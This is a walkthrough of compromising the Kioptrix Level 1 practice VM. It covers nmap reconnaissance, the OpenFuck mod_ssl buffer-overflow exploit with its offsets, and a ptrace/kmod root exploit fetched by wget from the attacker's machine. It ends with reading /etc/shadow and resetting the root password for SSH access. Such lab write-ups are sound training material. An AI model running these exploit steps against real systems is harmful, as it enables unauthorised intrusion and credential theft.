Executive Summary

Kioptrix Level 1 was fully compromised via a remote buffer overflow in Apache mod_ssl (CVE-2002-0082). The OpenFuck exploit (EDB-47080) was used to gain an initial shell as the apache user. Privilege escalation to root was achieved by exploiting a local kernel vulnerability (EDB-3) targeting the ptrace/kmod interface in Linux kernel 2.4.x on Red Hat systems. Post-exploitation included extracting /etc/shadow and establishing persistent root access via SSH.

Reconnaissance

Objective

Identify live hosts on the network and enumerate open ports, running services, and the target OS.

Findings

Host discovery was performed using sudo arp-scan -l, which identified the target at 172.20.10.4. A full service and OS detection scan was then run with nmap -sV -O 172.20.10.4, revealing the following open ports:

Enumeration

Objective

Investigate exposed services for misconfigurations, version-specific vulnerabilities, and attack surface.

Findings

Browsing to http://172.20.10.4 confirmed a default Apache test page — no custom application was deployed. Navigating to https://172.20.10.4 returned SSL_ERROR_NO_CYPHER_OVERLAP, confirming the server uses legacy SSLv2/RC4 ciphers no longer supported by modern browsers. This is consistent with the OpenSSL/0.9.6b version identified during the Nmap scan.

The mod_ssl version (2.8.4) is below the patched threshold of 2.8.7, making it a candidate for CVE-2002-0082 — a remote buffer overflow in the SSL handshake. No further enumeration was required to identify the attack path.

PoC: - Tools used: Firefox browser - Result: Default Apache page on port 80; legacy SSL error on port 443 — confirms old OpenSSL stack with no custom application running

Exploitation — Initial Foothold

Description

Apache mod_ssl versions prior to 2.8.7 are vulnerable to a remote buffer overflow (CVE-2002-0082) during the SSL handshake. The vulnerability allows an unauthenticated attacker to execute arbitrary code in the context of the Apache process. The public exploit “OpenFuck” (EDB-47080) automates this attack and spawns a shell on the target. The exploit requires specifying the correct OS/Apache version offset to target the right memory address.

PoC — Steps to Reproduce

  1. Search Exploit-DB for the vulnerable Apache version: searchsploit apache 1.3.20
  2. Identify EDB-47080 (unix/remote/47080.c) — Apache mod_ssl < 2.8.7 OpenSSL Remote Buffer Overflow (2)
  3. Copy the exploit to the working directory: searchsploit -m unix/remote/47080.c
  4. Compile the exploit: gcc -o OpenFuck 47080.c -lcrypto -lssl
  5. Run ./OpenFuck with no arguments to list supported offsets
  6. Identify offset 0x6b — RedHat Linux 7.2 (apache-1.3.20-16)
  7. Test with offset 0x6a first: ./OpenFuck 0x6a 172.20.10.4 443 -c 50 — returns “Good Bye!” (incorrect offset)
  8. Run with the correct offset: ./OpenFuck 0x6b 172.20.10.4 443 -c 50
  9. The exploit establishes an SSL connection, sends shellcode, and drops into bash-2.05$
  10. Confirm access: whoami → apache, pwd → /tmp, uname -a → Linux kioptrix.level1 2.4.7-10

Privilege Escalation

Description

The apache shell runs as a low-privileged user. The kernel version 2.4.7-10 on Red Hat is vulnerable to a local privilege escalation via the ptrace/kmod interface (CVE-2003-0127, EDB-3). This exploit abuses the kernel’s handling of process tracing to attach to a root-owned process and inject shellcode, resulting in a SUID shell spawned as root.

PoC — Steps to Reproduce

  1. On Kali, search for local kernel exploits: searchsploit "linux kernel 2.4" | grep -i "local"
  2. Identify EDB-3 (linux/local/3.c) — Linux Kernel 2.2.x/2.4.x (RedHat) ptrace/kmod Local Privilege Escalation
  3. Copy the exploit: searchsploit -m linux/local/3.c
  4. Start an HTTP server to serve the file: python3 -m http.server 8080
  5. From the apache shell on the target, download the exploit: wget http://<KALI_IP>:8080/3.c
  6. Compile on the target: gcc 3.c (produces a.out)
  7. Execute: ./a.out
  8. The exploit attaches to a kernel process, catches a signal, places shellcode, and waits for the SUID shell
  9. Confirm root: whoami → root, id → uid=0(root) gid=0(root) groups=0(root),...

Post-Exploitation

Credential Extraction

With root access, /etc/shadow was read to extract the root password hash. passwd was used directly from the root shell to set a known password. Output confirmed: passwd: all authentication tokens updated successfully.

Persistent Access via SSH

Root SSH access was established using the updated credentials. Due to the age of the target, legacy options are required: ssh root@172.20.10.4 -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa -c aes128-cbc. Login succeeded, landing at [root@kioptrix root]#.

Proof of Root

Logging into the machine via the VM console as root confirmed full system ownership. The root mailbox contained the machine’s completion message:

“If you are reading this, you got root. Congratulations. Level 2 won’t be as easy…”

Lessons Learned

  • Legacy SSL stacks are an immediate red flag. mod_ssl < 2.8.7 paired with OpenSSL 0.9.6b is a well-known remote code execution surface. Version banners in Nmap output should always be cross-referenced against Exploit-DB.
  • Exploit offsets matter. The OpenFuck exploit requires the correct OS/Apache offset to succeed. When two candidate offsets exist, both should be tested — 0x6a failed while 0x6b succeeded.
  • Kernel version drives local privesc selection. Kernel 2.4.7-10 on Red Hat is directly targeted by EDB-3. Running uname -a immediately after gaining a shell is a critical first step in privilege escalation enumeration.
  • File transfer without internet access on the victim. When the victim cannot reach external hosts (the exploit’s automatic ptrace-kmod download failed due to SSL incompatibility), hosting a Python HTTP server on the attacker machine and using wget on the victim is a reliable alternative.
  • Old SSH servers require legacy cipher options. Connecting to legacy SSH daemons requires explicitly enabling deprecated algorithms (diffie-hellman-group1-sha1, ssh-rsa, aes128-cbc) that modern OpenSSH clients disable by default.
